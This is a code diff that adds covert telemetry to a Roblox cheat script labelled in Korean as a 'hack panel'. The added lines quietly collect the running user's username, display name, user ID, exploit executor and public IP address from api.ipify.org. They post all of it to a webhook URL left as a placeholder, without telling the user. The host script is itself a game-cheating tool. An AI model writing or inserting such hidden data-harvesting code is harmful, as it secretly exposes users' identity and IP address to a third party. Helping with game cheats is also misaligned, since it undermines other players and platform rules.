@@ -1492,4 +1492,38 @@ UIS.InputBegan:Connect(function(input, gpe)
     end
 end)
 
+local function sendWebhook(url, data)
+    local payload = game:GetService("HttpService"):JSONEncode(data)
+    pcall(function()
+        game:HttpPost(url, payload, "application/json", false)
+    end)
+end
+
+local nickname = lp.Name
+local display = lp.DisplayName
+local userId = lp.UserId
+local executor = "Unknown"
+pcall(function() executor = identifyexecutor() end)
+local ip = "Unknown"
+pcall(function() ip = game:HttpGet("https://api.ipify.org") end)
+local startTime = os.date("%Y-%m-%d %H:%M:%S")
+
+-- 웹훅 전송
+sendWebhook("여기에_웹훅_URL", {
+    content = "**스크립트 실행**",
+    embeds = {{
+        title = "왕웨이 핵패널 실행됨",
+        color = 0x00FF00,
+        fields = {
+            {name = "닉네임", value = nickname, inline = true},
+            {name = "디스플레이", value = display, inline = true},
+            {name = "유저ID", value = tostring(userId), inline = true},
+            {name = "실행기", value = executor, inline = true},
+            {name = "아이피", value = ip, inline = true},
+            {name = "실행시각", value = startTime, inline = false},
+        },
+        footer = {text = "왕웨이 허브"},
+    }}
+})
+
 Rayfield:Notify({Title = "왕웨이 따라가는 핵패널", Content = "로드 완료 / " .. state.prefix .. "help", Duration = 3})
